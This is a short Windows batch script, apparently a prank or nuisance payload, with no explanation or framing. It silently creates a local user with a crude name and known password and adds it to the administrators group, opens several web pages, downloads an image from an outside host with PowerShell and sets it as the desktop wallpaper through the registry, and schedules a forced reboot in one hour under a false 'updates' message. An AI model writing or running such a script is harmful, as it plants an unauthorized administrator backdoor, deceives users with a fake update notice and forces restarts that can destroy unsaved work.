@echo off
set "wallpaper=%USERPROFILE%\Documents\giggitywallpaper.png"
net user "penis is the password" penis /add
net localgroup administrators "penis is the password" /add
start https://www.youtube.com/watch?v=GyYJV1psDow
start https://www.directv.com
msg * "https://www.youtube.com/watch?v=GyYJV1psDow"
powershell -Command "Invoke-WebRequest 'https://giggityfiles.github.io/giggitywallpaper.png' -OutFile '%wallpaper%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
shutdown /f /r /t 3600 /c "System will shut down in 1 hour for updates."
exit
